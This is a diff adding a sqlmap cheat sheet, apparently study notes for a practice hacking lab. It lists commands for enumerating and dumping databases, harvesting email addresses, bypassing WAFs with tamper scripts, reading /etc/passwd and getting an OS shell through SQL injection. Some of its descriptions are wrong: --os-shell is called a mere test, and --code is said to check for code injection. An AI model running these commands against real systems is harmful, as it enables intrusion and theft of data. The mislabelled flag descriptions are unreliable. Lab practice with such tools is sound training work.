@@ -1,0 +1,68 @@
+List Databases:
+
+sqlmap -r req4.txt --dbs
+Enumerates all databases in the target system.
+List Tables:
+
+sqlmap -r req4.txt -D peh-labs --tables
+Lists all tables in a specific database.
+List Columns:
+
+sqlmap -r req4.txt -D peh-labs -T injection0x03_products --columns
+Lists all columns in a specific table.
+Dump Specific Columns:
+
+sqlmap -r req4.txt -D peh-labs -T injection0x03_products -C name,price --dump
+Dumps data from specific columns in a table.
+Search for Data:
+
+sqlmap -r req4.txt --search -C email --string '@gmail.com'
+Searches for specific data within the database.
+Bypass WAF:
+
+sqlmap -r req4.txt --tamper=space2comment
+Uses a tamper script to bypass Web Application Firewalls.
+Custom User-Agent:
+
+sqlmap -r req4.txt --user-agent="Mozilla/5.0 ... Chrome/92.0.4515.107 Safari/537.36"
+Spoofs a browser User-Agent to bypass restrictions.
+Time-Based Blind SQL Injection:
+
+sqlmap -r req4.txt --time-sec=10
+Exploits time-based blind SQL injection vulnerabilities.
+Read File from Server:
+
+sqlmap -r req4.txt --file-read=/etc/passwd
+Reads a file from the server using SQL injection.
+Execute OS Command:
+
+sqlmap -r req4.txt --os-cmd="whoami"
+Executes a system command via SQL injection.
+List Database Users:
+
+sqlmap -r req4.txt --users
+Enumerates all database users in the system.
+Check User Privileges:
+
+sqlmap -r req4.txt --privileges -U dbuser
+Checks the privileges of a specific database user.
+OS Command Injection Test:
+
+sqlmap -r req4.txt --os-shell
+Tests for OS command injection vulnerabilities.
+Code Injection Test:
+
+sqlmap -r req4.txt --code
+Checks for potential code injection vulnerabilities.
+Use a Proxy:
+
+sqlmap -r req4.txt --proxy=http://127.0.0.1:8080
+Routes SQLMap traffic through a proxy server.
+Adjust Level and Risk:
+
+sqlmap -r req4.txt --level=5 --risk=3
+Increases the level and risk for more aggressive testing.
+Automated Testing:
+
+sqlmap -r req4.txt --batch
+Runs SQLMap in automated mode with all tests.
